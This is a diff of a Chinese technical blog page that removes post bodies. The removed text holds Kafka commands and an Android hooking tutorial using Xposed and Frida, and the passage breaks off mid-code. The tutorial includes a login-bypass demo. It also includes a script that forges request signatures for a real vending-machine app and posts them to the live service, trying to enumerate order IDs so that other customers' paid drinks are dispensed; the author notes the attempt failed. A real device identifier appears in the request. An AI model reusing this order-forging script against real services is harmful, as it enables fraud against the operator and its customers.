@@ -236,11 +236,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h4 id="查看topic"><a href="#查看topic" class="headerlink" title="查看topic"></a>查看topic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./kafka-topics.sh --zookeeper ip：2181 --list（列出所有topic）</div></pre></td></tr></table></figure>
-<h4 id="控制台接收信息"><a href="#控制台接收信息" class="headerlink" title="控制台接收信息"></a>控制台接收信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bin/kafka-console-consumer.sh --zookeeper  ip：2181  --from-beginning --topic test</div></pre></td></tr></table></figure>
-<h4 id="zookeeper命令"><a href="#zookeeper命令" class="headerlink" title="zookeeper命令"></a>zookeeper命令</h4><blockquote>
-<p>dump：列出未完成的会话和临时节点<br>  envi: 打印有关服务环境的详细信息<br>  reqs：列出未完成的请求<br>  ruok：测试服务器是否运行再非错误状态<br>  stat：列出有关性能和连接的客户端的统计信息</p>
-</blockquote>
-
+        
+          <a class="article-more-a" href="/2017/01/09/软件/kafka命令操作/#more">more >></a>
+        
       
 
       
@@ -293,79 +291,11 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="xposed框架"><a href="#xposed框架" class="headerlink" title="xposed框架"></a>xposed框架</h2><p>xposed，主页：<a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="external">http://repo.xposed.info/module/de.robv.android.xposed.installer</a><br>是个开源的框架，在github上有源码的，直接下载apk后安装激活就可以使用，很多地方有这方面的教程，针对不同的手机架构，有大牛做了针对性的修改。可以在论坛中进行搜索</p>
-<p>通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。</p>
-<p>Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码</p>
-<p>很多人将这个框架用在对android的私有化定制上面，其实在android安全测试方面这个框架提供了很大的便利，xposed主要是对方法的hook，在以往的重打包技术中，需要对smali代码的进行修改，修改起来比较麻烦。</p>
-<p>利用xposed框架可以很容易的获取到android应用中的信息，比如加密私钥、salt值等等，不需要饭编译获取密钥转换算法、不需要了解密钥保存机制，直接hook函数，获取输入输出就可以。</p>
-<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在Android系统中，应用程序进程都是由Zygote进程孵化出来的，而Zygote进程是由Init进程启动的。Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例。这也是Xposed选择替换app_process的原因。<br>Zygote进程在启动的过程中，除了会创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去。注意，一个应用程序进程被Zygote进程孵化出来的时候，不仅会获得Zygote进程中的Dalvik虚拟机实例拷贝，还会与Zygote一起共享Java运行时库。这也就是可以将XposedBridge这个jar包加载到每一个Android应用程序中的原因。XposedBridge有一个私有的Native（JNI）方法hookMethodNative，这个方法也在app_process中使用。这个函数提供一个方法对象利用Java的Reflection机制来对内置方法覆写。有能力的可以针对xposed的源码进行分析，不得不说，作者对于android的机制和java的了解已经相当深入了。</p>
-<h4 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h4><p>很简单的一个android登入代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">public class MainActivity extends AppCompatActivity &#123;</div><div class="line"></div><div class="line">    private TextView accountView;</div><div class="line">    private TextView passwdView;</div><div class="line">    private Button loginBut;</div><div class="line">    private Button quitBut;</div><div class="line"></div><div class="line">    @Override</div><div class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</div><div class="line">        super.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line"></div><div class="line">        accountView = (TextView) findViewById(R.id.account);</div><div class="line">        passwdView = (TextView) findViewById(R.id.pwd);</div><div class="line"></div><div class="line">        loginBut = (Button) findViewById(R.id.login);</div><div class="line">        quitBut = (Button) findViewById(R.id.quit);</div><div class="line"></div><div class="line">        loginBut.setOnClickListener(new View.OnClickListener() &#123;</div><div class="line">            @Override</div><div class="line">            public void onClick(View v) &#123;</div><div class="line">                String username = accountView.getText() + &quot;&quot;;</div><div class="line">                String password = passwdView.getText() + &quot;&quot;;</div><div class="line">                if(isCorrectInfo(username,password))&#123;</div><div class="line">                    Toast.makeText(MainActivity.this,&quot;登入成功&quot;,Toast.LENGTH_LONG).show();</div><div class="line">                &#125;</div><div class="line">                else&#123;</div><div class="line">                    Toast.makeText(MainActivity.this,&quot;登入失败&quot;,Toast.LENGTH_LONG).show();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public boolean isCorrectInfo(String username, String password) &#123;</div><div class="line">        if(username.equals(&quot;admin&quot;) &amp;&amp; password.equals(&quot;passwd&quot;))&#123;</div><div class="line">            return true;</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">            return false;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>很简单的就是判断下用户输入的用户名和密码是正确，这里做个简单的演示，将用户输入的用户名和密码信息hook出来不管正确与否</p>
-<p>简单说下xposed模块的开发，首先需要的是导入api，具体的可以参考：<a href="https://github.com/rovo89/XposedBridge/wiki/Using-the-Xposed-Framework-API" target="_blank" rel="external">https://github.com/rovo89/XposedBridge/wiki/Using-the-Xposed-Framework-API</a></p>
-<p>在manifest中定义</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">android:label</span>=<span class="string">"xposed"</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">meta-data</span></span></div><div class="line">           <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span></div><div class="line">           <span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</div><div class="line">       <span class="tag">&lt;<span class="name">meta-data</span></span></div><div class="line">           <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span></div><div class="line">           <span class="attr">android:value</span>=<span class="string">"hook test"</span> /&gt;</div><div class="line">       <span class="tag">&lt;<span class="name">meta-data</span></span></div><div class="line">           <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span></div><div class="line">           <span class="attr">android:value</span>=<span class="string">"82"</span> /&gt;</div><div class="line">   <span class="tag">&lt;/<span class="name">application</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>声明这个是xposed模块，名称为hook test 并且使用api版本号是82</p>
-<p>下面创建运行时候的hook代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.example.xposed;</div><div class="line"></div><div class="line"><span class="keyword">import</span> java.util.List;</div><div class="line"></div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</div><div class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</div><div class="line"></div><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</div><div class="line">    <span class="comment">// 包加载的时候回调</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">        <span class="comment">//过滤掉不是com.example.logintest的应用</span></div><div class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">"com.example.logintest"</span>))</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        XposedBridge.log(<span class="string">"加载应用:"</span> + lpparam.packageName);</div><div class="line"></div><div class="line">        <span class="comment">// Hook MainActivity 中的判断方法</span></div><div class="line">        findAndHookMethod(<span class="string">"com.example.logintest.MainActivity"</span>, lpparam.classLoader, <span class="string">"isCorrectInfo"</span>, String.class,String.class <span class="keyword">new</span> XC_MethodHook() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line">                <span class="keyword">super</span>.beforeHookedMethod(param);</div><div class="line">                <span class="comment">// XposedBridge.log("开始劫持~~~~");</span></div><div class="line">                <span class="comment">// XposedBridge.log("参数1:" + param.args[0]);</span></div><div class="line">               XposedBridge.log(<span class="string">"参数2:"</span> + param.args[<span class="number">1</span>]);</div><div class="line">               XposedBridge.log(<span class="string">"修改登入数据~~~~"</span>);<span class="comment">// 修改为正确的用户名密码</span></div><div class="line">               param.args[<span class="number">0</span>]=<span class="string">"admin"</span>;</div><div class="line">               param.args[<span class="number">1</span>]=<span class="string">"passwd"</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</div><div class="line"><span class="comment">//                super.afterHookedMethod(param);</span></div><div class="line">                XposedBridge.log(<span class="string">"劫持结束~~~~"</span>);</div><div class="line"><span class="comment">//                XposedBridge.log("参数1:" + param.args[0]);</span></div><div class="line"><span class="comment">//                XposedBridge.log("参数2:" + param.args[1]);</span></div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>看代码中的注释，主要是三个方法的调用，handleLoadPackage，主要是获取到android包的相关信息，这里由于只是对logintest进行hook,做下简单的判断。</p>
-<p>findAndHookMethod 是主要的hook入口，里面几个参数分别为包名，classloader，hook的函数名，参数类型（这个比较容易出错，比如list类型写为List.class）,回调函数</p>
-<p>回调函数中比较重要的：beforeHookedMethod和afterHookedMethod，一个是在函数运行前劫持掉，一个是hook后放行，实例中对用户输入的字段进行劫持打印，后面将参数之改为正确登入用户名和密码，这样在app中输入任何字符都能登入成功</p>
-<h2 id="frida-Hook框架"><a href="#frida-Hook框架" class="headerlink" title="frida Hook框架"></a>frida Hook框架</h2><p>Frida是一款基于python + javascript 的hook框架，通杀android\ios\linux\win\osx等各平台，由于是基于脚本的交互，因此相比xposed和substrace cydia更加便捷，本文重点介绍Frida在android下面的使用。</p>
-<p>Frida的官网为：<a href="http://www.frida.re/" target="_blank" rel="external">http://www.frida.re/</a></p>
-<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装Frida非常简单，在pc端直接执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install frida</div></pre></td></tr></table></figure></p>
-<p>即可</p>
-<p>在Android设备需要导入frida的服务端，需要root你的手机</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ curl -O http://build.frida.re/frida/android/arm/bin/frida-server</div><div class="line">$ chmod+x frida-server</div><div class="line">$ adb push frida-server /data/local/tmp/</div></pre></td></tr></table></figure>
-<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>设备上运行frida-server:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ adb shell</div><div class="line">root@android:/ chmod 700 frida-server</div><div class="line">$ adb shell</div><div class="line">root@android:/ /data/local/tmp/frida-server -t 0 (注意在root下运行)</div></pre></td></tr></table></figure>
-<p>电脑上运行adb forward tcp转发:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">adb forward tcp:27042 tcp:27042</div><div class="line">adb forward tcp:27043 tcp:27043</div></pre></td></tr></table></figure>
-<p>27042端口用于与frida-server通信,之后的每个端口对应每个注入的进程.</p>
-<p>运行如下命令验证是否成功安装:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ frida-ps-R</div></pre></td></tr></table></figure>
-<p>正常情况应该输出进程列表如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PID NAME</div><div class="line"> 1590 com.facebook.katana</div><div class="line">13194 com.facebook.katana:providers</div><div class="line">12326 com.facebook.orca</div><div class="line">13282 com.twitter.android</div><div class="line">…</div></pre></td></tr></table></figure>
-<h4 id="Hook模块的编写"><a href="#Hook模块的编写" class="headerlink" title="Hook模块的编写"></a>Hook模块的编写</h4><p>hook的主要模块是js编写的，利用javascript的api与server进行通信</p>
-<p>下面结合一个真实例子进行简单的介绍，首先是测试代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida, sys <span class="comment">#引入frida类</span></div><div class="line"><span class="keyword">import</span> logging</div><div class="line"></div><div class="line">logging.basicConfig(filename=<span class="string">'test.log'</span>, level=logging.INFO)</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>) <span class="comment">#对输出进行utf8的编码</span></div><div class="line"><span class="keyword">print</span> sys.getdefaultencoding()</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_result</span><span class="params">(message)</span>:</span> <span class="comment">#对输出的信息进行打印</span></div><div class="line">    <span class="keyword">print</span> message</div><div class="line">    logging.info(message)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span> <span class="comment"># 反调函数，用来接受message的信息，message后面会说到</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        print_result(message=message)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"></div><div class="line">did = <span class="string">"255601452"</span> <span class="comment"># 订单id</span></div><div class="line">time = <span class="string">"1472706588"</span> <span class="comment"># 时间戳</span></div><div class="line"></div><div class="line">jscode = <span class="string">""" # 核心代码，这段主要是调用app中的相应处理函数，后面会分析这段代码的来源</span></div><div class="line"></div><div class="line">Dalvik.perform(function () &#123; # 说明是Dalvik平台</div><div class="line">    var currentApplication = Dalvik.use("android.app.ActivityThread").currentApplication();</div><div class="line">    var context = currentApplication.getApplicationContext();</div><div class="line">    var signclass = Dalvik.use("com.ub.main.d.e");# 调用com.ub.main.d.e类</div><div class="line">    var signInstance=signclass.$new(context); # 反射创建一个新的对象</div><div class="line">    var sign=signInstance.a("255601452"); #调用对象的a函数</div><div class="line">    send(sign); #将调用函数的结果发送出来</div><div class="line">&#125;);</div><div class="line">"""</div><div class="line"><span class="comment">#print jscode</span></div><div class="line"></div><div class="line">process = frida.get_device_manager().enumerate_devices()[<span class="number">-1</span>].attach(<span class="string">"com.ub.main"</span>) <span class="comment"># 获取连接的设备并枚举取最后一个设备连接，并附到com.ub.main的进程上面</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> process</div><div class="line"></div><div class="line">script = process.create_script(jscode) <span class="comment"># 调用相应的js函数，获取函数调用后的结果值</span></div><div class="line">script.on(<span class="string">'message'</span>, on_message) <span class="comment"># 利用回调，将message传递给on_message函数</span></div><div class="line"><span class="keyword">print</span> <span class="string">"done"</span></div><div class="line">script.load()</div></pre></td></tr></table></figure>
-<h4 id="反编译获取app中的核心函数"><a href="#反编译获取app中的核心函数" class="headerlink" title="反编译获取app中的核心函数"></a>反编译获取app中的核心函数</h4><p>对于上面的js代码，其实就是调用app中的某个函数，比如sign值生成函数，加密解密函数，不需要自己单独的去分析算法流程，分析key值在哪，直接调用app的相应函数，让app帮我们完成这些工作</p>
-<p>这里我们分析的app是友宝，这是一款饮料售货机，当时抓包看到提货的时候是只有个订单id的，猜想是不是遍历订单的id，支付成功但是没有取货的订单会不会响应请求，自己掉货出来</p>
-<p>下面对友宝的订单进行分析过程</p>
-<ol>
-<li>抓取支付订单成功链接</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://monk.uboxol.com/morder/shipping?clientversion=5.7.2&amp;machine_type=MI+5&amp;os=6.0.1&amp;channel_id=1&amp;device_no=02%3A00%3A00%3A00%3A00%3A00&amp;imei=869161021849708&amp;device_id=2&amp;u=32020&amp;wake_id=0&amp;net_type=1&amp;carrier_type=1&amp;s=4</div><div class="line"></div><div class="line">postdata：sign=et09HgkvWcNc%252FTLe3E7Qj4j6MZEPbnm2zbCzJ3esTi0n6qo6T2RE6Qggh3rYytoTbKHGC1O3ghNPPZqoXSF%252FlzsRK2BnkLouKdZ%252BLnyZgdGrYgOyRv2piGOHnUwAhz5%252BUOWbH5ljMvNBgvTJwWsTy200bW2FAA%252BRkqNCn%252F4qIvo%253D&amp;orderId=255601452&amp;timestamp=1472706588</div></pre></td></tr></table></figure>
-<p>分析：<br>sign是校验值，主要是防止订单伪造的，orderid是产生的支付订单id，这个主要是防止伪造用</p>
-<ol>
-<li>反编译友宝app</li>
-</ol>
-<p>找到morder/shipping所在的包为：com/ub/main/d/e.class</p>
-<p>其中localStringBuffer存储的就是url中的参数信息，该请求查找到的代码在a()</p>
-<p>生成签名的函数在com/ub/main/d/e.class中的b函数</p>
-<p>最后加上sign值，发送请求</p>
-<ol>
-<li>可以反编译出他的sign计算方法，也可以直接调用b函数来产生sign值，后来发现app会自动取时间戳，我们就不需要给他array型的参数</li>
-</ol>
-<p>直接调用a函数，把orderId给他，让他直接return一个值出来就好了，就有了上面的js代码</p>
-<ol>
-<li>自动化的批量处理</li>
-</ol>
-<p>看代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># __author__ = 'adrain'</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida, sys</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">logging.basicConfig(filename=<span class="string">'test.log'</span>, level=logging.INFO)</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># print sys.getdefaultencoding()</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ubox</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, payload)</span>:</span></div><div class="line">        <span class="comment"># print "requests"</span></div><div class="line">        dict = &#123;&#125;</div><div class="line">        url = <span class="string">"http://monk.uboxol.com/morder/shipping?clientversion=5.7.2&amp;machine_type=MI+5&amp;os=6.0.1&amp;channel_id=1&amp;device_no=02%3A00%3A00%3A00%3A00%3A00&amp;imei=869161021849708&amp;device_id=2&amp;u=41493965&amp;wake_id=0&amp;net_type=1&amp;carrier_type=1&amp;s=4"</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> payload.split(<span class="string">"&amp;"</span>):</div><div class="line">            key = i.split(<span class="string">"="</span>)[<span class="number">0</span>]</div><div class="line">            value = i.split(<span class="string">"="</span>)[<span class="number">1</span>]</div><div class="line">            dict[key] = value</div><div class="line"></div><div class="line">        data=dict</div><div class="line"></div><div class="line">        r=requests.post(url=url,data=data)</div><div class="line"></div><div class="line">        <span class="keyword">print</span> r.text</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_result</span><span class="params">(self, message)</span>:</span></div><div class="line">        <span class="comment"># print message</span></div><div class="line">        payload = message[<span class="string">"payload"</span>]</div><div class="line">        <span class="keyword">print</span> payload</div><div class="line">        self.request(payload)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(self, message, data)</span>:</span></div><div class="line">        self.print_result(message=message)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fuzzing</span><span class="params">(self, did)</span>:</span></div><div class="line">        jscode = <span class="string">"""</span></div><div class="line">        Dalvik.perform(function () &#123;</div><div class="line">        var currentApplication = Dalvik.use("android.app.ActivityThread").currentApplication();</div><div class="line">        var context = currentApplication.getApplicationContext();</div><div class="line">        var signclass = Dalvik.use("com.ub.main.d.e");</div><div class="line">        var signInstance=signclass.$new(context);</div><div class="line">        var sign=signInstance.a("%s");</div><div class="line">        send(sign);</div><div class="line">        &#125;);</div><div class="line">        """ % did</div><div class="line">        <span class="comment"># print jscode</span></div><div class="line">        process = frida.get_device_manager().enumerate_devices()[<span class="number">-1</span>].attach(<span class="string">"com.ub.main"</span>)</div><div class="line">        <span class="comment"># print process</span></div><div class="line">        script = process.create_script(jscode)</div><div class="line">        script.on(<span class="string">'message'</span>, self.on_message)</div><div class="line">        <span class="comment"># print "done"</span></div><div class="line">        script.load()</div><div class="line">        <span class="comment"># sys.stdin.read()</span></div><div class="line"></div><div class="line">ub = ubox()</div><div class="line">ub.fuzzing(<span class="string">"255912964"</span>)</div></pre></td></tr></table></figure>
-<p>构造了一个类，后面直接fuzz uid就可以了，提取里面的sign值拼接到post数据中去</p>
-<p>可以产生的post请求和抓到的数据包的请求是完全一样的，但是并没有测试成功，分析原因有可能是订单id和用户的id有所绑定。</p>
-<p>不过学习到了怎样通过frida对app进行分析。</p>
-<h2 id="复杂参数的hook"><a href="#复杂参数的hook" class="headerlink" title="复杂参数的hook"></a>复杂参数的hook</h2><p>如果遇到函数的参数类型是数组、map、ArrayList类型的，首先目标MyClass类的fun1函数，声明如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">fun1</span><span class="params">(String[][] strAry, Map mp1, Map&lt;String,String&gt; mp2, Map&lt;Integer, String&gt; mp3,</span></span></div><div class="line">                      ArrayList&lt;String&gt; al1, ArrayList&lt;Integer&gt; al2, ArgClass ac)</div></pre></td></tr></table></figure>
-<p>解决方法：</p>
-<p>用Xposed自身提供的XposedHelpers的findClass方法加载每一个类，然后再将得到的类传递给hook函数作参数！</p>
-<p>实例代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">package aqcxbom.myxposed;</div><div class="line">import android.util.Log;</div><div class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</div><div class="line">import de.robv.android.xposed.XC_MethodHook;</div><div class="line">import de.robv.android.xposed.XposedHelpers;</div><div class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</div><div class="line">/**</div><div class="line"> * Created by AqCxBoM on 2016/12/24.</div><div class="line"> */</div><div class="line">public class XposedMain implements IXposedHookLoadPackage</div><div class="line">&#123;</div><div class="line">    public String TAG = &quot;AqCxBoM&quot; ;</div><div class="line">    private final String mStrPackageName = &quot;aqcxbom.xposedhooktarget&quot;; //HOOK APP目标的包名</div><div class="line">    private final String mStrClassPath = &quot;aqcxbom.xposedhooktarget.MyClass&quot;; //HOOK 目标类全路径</div><div class="line">    private final String mStrMethodName = &quot;fun1&quot;; //HOOK 目标函数名</div><div class="line">    private void LOGI(String ct)&#123; Log.d(TAG, ct); &#125;</div><div class="line">    @Override</div><div class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable &#123;</div><div class="line">            //判断包名是否一致</div><div class="line">        if (loadPackageParam.packageName.equals(mStrPackageName)) &#123;</div><div class="line">            LOGI(&quot;found target: &quot; + loadPackageParam.packageName);</div><div class="line">            final Class&lt;?&gt; ArgClass= 